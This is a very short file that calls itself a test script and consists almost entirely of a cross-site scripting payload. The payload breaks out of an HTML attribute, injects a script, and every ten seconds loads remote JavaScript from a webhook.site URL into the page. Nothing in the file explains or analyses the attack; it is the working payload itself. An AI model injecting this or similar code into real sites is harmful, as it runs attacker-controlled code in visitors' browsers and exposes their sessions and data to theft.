THIS IS A TEST SCRIPT
""><script>function connectLoader(retval) {
    var URL= 'http://webhook.site/d53b621b-ded0-468c-adae-3a436d8f9f12';
    var scriptTag = document.getElementById('loadScript');
    var head = document.getElementsByTagName('head').item(0);
    if(scriptTag) head.removeChild(scriptTag);
    var script = document.createElement('script');
    script.src = URL;
    script.type = 'text/javascript';
    script.id = 'loadScript';
    head.appendChild(script);
}
setInterval('connectLoader()',10000);</script>
